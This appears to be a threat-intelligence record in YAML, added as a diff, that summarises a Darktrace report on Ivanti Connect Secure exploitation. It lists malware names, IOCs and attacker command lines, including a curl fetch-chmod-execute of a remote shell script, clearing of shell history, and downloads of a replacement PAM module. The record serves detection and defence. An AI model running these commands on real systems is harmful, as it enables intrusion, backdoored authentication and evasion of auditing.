@@ -1,0 +1,71 @@
+description: 'The Darktrace 2024 Annual Threat Report highlights the exploitation
+  of Common Vulnerabilities and Exposures (CVEs) in edge infrastructure, specifically
+  focusing on recent activity related to vulnerabilities in Ivanti Connect Secure
+  (CS), Policy Secure (PS), and Zero Trust Access (ZTA) products. The report details
+  investigations into suspicious activity across customer networks, including attempts
+  at privilege escalation, malicious file downloads, and network scanning.
+
+  '
+attribution: Unknown
+malware_families:
+- DeElevate64.exe
+- DeElevator64.dll
+authors:
+- Nahisha Nobregas
+- Emma Foulger
+- Ryan Trail
+- Darktrace Threat Research Team
+TTPs:
+  processes:
+  - curl
+  - wget
+  - fopen
+  - fprintf
+  - fclose
+  - sshd
+  commandline:
+  - curl -0 http://1.lusyn.xyz/jc/jc.sh
+  - chmod 777 jc.sh
+  - ./jc.sh
+  - history -c
+  - curl o "$pam_file" "$pam_url"
+  - wget -0 "$pam_file" "$pam_url"
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: curl
+    destination_address: 104.238.130[.]185
+    url: http://104.238.130[.]185/DeElevate64.exe
+    port: ''
+  - executable: curl
+    destination_address: 104.238.130[.]185
+    url: http://104.238.130[.]185/DeElevator64.dll
+    port: ''
+  - executable: net_http__ptr_Client_Get
+    destination_address: 104.238.130[.]185
+    url: http://104.238.130[.]185/getNetworkxmMd5
+    port: ''
+  file_activity:
+  - /usr/bin/con.txt
+  - C$ share (aDeElevate64.exe)
+  - C$ share (aDeElevator64.dll)
+  - to.bat
+  - /usr/bin/pam_unix.so
+  persistence:
+  - Exploitation of the task scheduler to facilitate initial or recurring execution
+    of malicious code.
+  pipes: ''
+  process_relations: ''
+IOCs:
+- 104.238.130[.]185
+- http://104.238.130[.]185/DeElevate64.exe
+- http://104.238.130[.]185/DeElevator64.dll
+- DESKTOP-1JIMIV3
+- aDeElevate64.exea
+- aDeElevator64.dlla
+- to.bat
+reference: https://www.darktrace.com/blog/darktraces-early-detection-of-the-latest-ivanti-exploits
+date_of_publication: May 28, 2025
+file_creation_date: May 28, 2025
